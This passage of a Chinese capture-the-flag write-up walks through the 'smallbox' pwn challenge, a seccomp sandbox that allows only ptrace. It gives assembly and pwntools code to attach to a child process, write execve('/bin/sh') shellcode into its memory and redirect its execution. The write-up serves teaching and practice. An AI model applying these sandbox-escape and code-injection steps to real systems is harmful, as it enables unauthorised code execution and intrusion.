## 其它问题解决

但是，打远程靶机会发现打不通。经过反复调试排查发现，在本地没有`gdb`调试的情况下，也无法拿到`shell`权限。

原因如下：

1. `ptrace_attach`操作需要时间，如果还没有成功附加进程就直接执行后续命令，会导致后续命令执行失败。
2. 如果没有`gdb`，执行完汇编代码后，主进程会结束，同时将子进程一起`kill`，无法继续交互。

解决方法：

1. 在`ptrace_attach`的后面利用循环增加延时操作：

```assembly
mov ecx, 0x100000
delay:
nop
loop delay
```

2. 在汇编代码的末尾增加`jmp $`让主进程进入死循环，避免子进程随着主进程结束。

# smallbox

## 前言

题目名：smallbox

解题数：52

题目描述：你能从这个小盒子里逃出来吗？

知识点：沙箱绕过（只允许`ptrace`）

`ptrace`是 Linux 系统中一个非常重要的系统调用，它允许一个进程观察和控制另一个进程的执行，并可以检查和修改被跟踪进程的内存和寄存器。

这个系统调用是实现调试器（如`gdb`）和 Hook 的核心机制，函数原型：

```c
#include <sys/ptrace.h>
long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
```

- `request`：指定要执行的操作类型，可以是以下值之一：
  - `PTRACE_TRACEME`：表示当前进程将被其父进程跟踪。
  - `PTRACE_PEEKTEXT`、`PTRACE_PEEKDATA`：从被跟踪进程的内存中读取一个字。
  - `PTRACE_POKETEXT`、`PTRACE_POKEDATA`：向被跟踪进程的内存中写入一个字。
  - `PTRACE_GETREGS`、`PTRACE_GETFPREGS`：获取被跟踪进程的寄存器值。
  - `PTRACE_SETREGS`、`PTRACE_SETFPREGS`：设置被跟踪进程的寄存器值。
  - `PTRACE_CONT`：继续执行被跟踪的进程。
  - `PTRACE_SINGLESTEP`：单步执行被跟踪的进程。
  - `PTRACE_SYSCALL`：继续执行并在下一个系统调用入口或出口处停止。
  - `PTRACE_ATTACH`：附加到指定的进程并开始跟踪。
  - `PTRACE_DETACH`：停止跟踪并让被跟踪进程继续执行。
  - 以及其他更多选项……

- `pid`：目标进程的进程 ID。
- `addr`：内存地址，具体含义取决于`request`参数。
- `data`：数据指针，具体含义取决于`request`参数。

## 逆向分析

逆向分析非常简单，找到`main`函数：

![image-20250730212311672](https://bbs.kanxue.com/upload/attach/202508/912098_SVCMEYNWKHHTCP4.png)

程序先通过`mmap`函数申请地址`0xDEADC0DE000LL`处的`0x1000`大小的空间，并赋予`rwx`权限。

然后执行`fork`函数创建子进程，并让子进程进入`while(1);`死循环。

父进程继续执行，读取我们的输入到`0xDEADC0DE000LL`内存，加载沙箱，最后将我们的输入作为汇编指令执行。

## 利用思路

### 查看沙箱保护

我们使用`seccomp-tools`工具查看程序的沙箱保护情况：

![image-20250730212555270](https://bbs.kanxue.com/upload/attach/202508/912098_EDPS67ZFMWBWJVD.png)

程序只允许我们执行`ptrace`系统调用，这其实给我们提示了这道题目的解题方法。

### 整体利用思路

我们输入的汇编指令需要多次通过`ptrace`系统调用拿下 Shell：

1. 通过汇编指令获取子进程的 PID。
2. 通过`PTRACE_ATTACH`附加子进程。
3. 通过`PTRACE_POKETEXT`将`shellcode`写入到子进程。
4. 通过`PTRACE_GETREGS`获取子进程的寄存器的值。
5. 修改`RIP`寄存器指向我们的`shellcode`。
6. 通过`PTRACE_SETREGS`将修改后的寄存器的值写入子进程。
7. 通过`PTRACE_DETACH`让子进程脱离附加状态，继续自主运行。

### 详细利用思路

通过上述操作，子进程最终会执行我们写入的`shellcode`，具体步骤如下所示。

1. 通过汇编指令获取子进程的 PID。

   通过`fork`函数获取的子进程 PID 会被存储在变量`pid（rbp-0xC）`中，我们将其存储到`rbx`寄存器中：

   ```assembly
   xor rbx, rbx
   mov ebx, dword ptr [rbp-0xc]
   ```

   可以使用`gdb`调试，查看`rbx`寄存器的内容是否被正确修改：

   ```python
   shellcode = asm("""
   xor rbx, rbx
   mov ebx, dword ptr [rbp-0xc]
   """)
   gdb.attach(p, 'b *$rebase(0x143F)\nc')
   pause()
   p.sendafter(b'shellcode: \n', shellcode)
   ```

   可以看到，`rbx`寄存器的值成功被修改为子进程的 PID。

2. 使用`PTRACE_ATTACH`附加子进程。

   ```c
   int ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
   ```

   对应的汇编代码：

   ```assembly
   mov rdi, 16
   mov rsi, rbx
   xor rdx, rdx
   xor r10, r10
   mov rax, 101
   syscall
   ```

   对应的脚本：

   ```python
   shellcode = asm("""
   xor rbx, rbx
   mov ebx, dword ptr [rbp-0xc]

   mov rdi, 16
   mov rsi, rbx
   xor rdx, rdx
   xor r10, r10
   mov rax, 101
   syscall
   """)
   gdb.attach(p, 'b *$rebase(0x143F)\nc')
   pause()
   p.sendafter(b'shellcode: \n', shellcode)
   ```

   可以使用`gdb`调试查看是否附加成功：

   ![image-20250730213923653](https://bbs.kanxue.com/upload/attach/202508/912098_AE7GM9CUBD92K7N.png)

   返回值被存储在`rax`寄存器，为 0 代表附加成功。

3. 通过`PTRACE_POKETEXT`将`shellcode`写入到子进程。

   ```c
   long ptrace(PTRACE_POKETEXT, pid_t pid, void *addr, long data);
   ```

   在 64 位系统中，每次只能写入 8 字节的数据。因此，我们需要先将`shellcode`转换为 8 字节为一组的数据。

   具体做法如下所示：

   ```python
   shellcode = asm("""
   mov rbx, 0x68732f6e69622f
   push rbx
   push rsp
   pop rdi
   xor esi, esi
   xor edx, edx
   push 0x3b
   pop rax
   syscall
   """)

   for i in range(0, len(shellcode), 8):
       print(hex(u64(shellcode[i:i+8].ljust(8, b'\x00'))))

   # 0x732f6e69622fbb48
   # 0x31f6315f54530068
   # 0x50f583b6ad2
   ```
